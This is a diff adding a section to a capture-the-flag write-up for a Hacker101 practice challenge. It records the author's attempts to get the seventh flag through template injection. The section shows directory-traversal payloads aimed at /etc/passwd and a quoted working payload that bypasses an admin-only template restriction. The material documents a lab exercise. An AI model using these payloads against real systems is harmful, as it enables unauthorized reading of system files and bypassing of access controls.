@@ -221,11 +221,33 @@ Hence, going to: `https://b43b6a4b819e36587e6f22e21cf3ac9a.ctf.hacker101.com/my-
 
 This will show the flag and the event `Launch DDoS Against Santa's Workshop!`</br>
 
+## Solution 7th flag
+Fuzzing for endpoints, it showed `new` and the following `templates`:
+```
+* cbdj3_grinch_header.html
+* cbdj3_grinch_footer.html
+* 38dhs_admins_only_header.html
+```
 
+When looking at the existing mail campaign 'Guess What', it includes templates inside the Markup as `{{template:....}}`</br>
+Include the template `38dhs_admins_only_header.html`: `{{template:38dhs_admins_only_header.html}}`</br>
 
+This will return:
+`You do not have access to the file 38dhs_admins_only_header.html`
 
+When trying to apply directory traversal with template injection: `{{template:../../../../../../../../../etc/passwd}}` it is escaping all the forward slashes</br>
+The same is happening for the following:
+```
+{{template:..//..//..//..//..//..//..//..//..//etc/passwd}}
+{{template:..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd}}
+{{template:..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd}}
+```
 
+This is where I got stuck with the template injection.</br>
+For this I lookedup some writeups from others and Jakub Łakomy came to the following payload which worked and showed the flag:</br>
+`preview_markup=hello{{template:cbdj3_/*grinch*/_header.html}}{{77}}&preview_data={"name":"admin","email":"admin@admin.com","admin":true,"administrator":true,"77":"{{template:38dhs_/*admins_only*/_header.html}}"}`
 
+This requires diving deeper into the solution at a later stage, as I am not 100% sure how Jakub came to this solution.</br>
 
-
+## Solution 8th flag
 
